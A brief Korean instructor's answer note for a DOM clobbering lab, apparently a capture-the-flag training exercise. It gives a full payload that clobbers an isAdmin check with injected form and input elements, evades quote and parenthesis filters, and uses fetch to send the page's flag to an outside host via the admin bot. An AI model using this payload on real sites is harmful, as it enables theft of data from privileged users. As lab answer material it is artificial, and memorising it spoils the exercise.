# [강사용] DOM Clobbering
`?c=/<form id=CLOB><input id=isAdmin>/;_=String.fromCharCode(0x2f);fetch(/http:/.source+_+_+/host.docker.internal:8000?a=/.source+flag.innerText)` 형태(따옴표/괄호 우회). report 에 내부 URL 제출 → 봇(admin/내부)일 때 flag 노출 → 외부 전송.
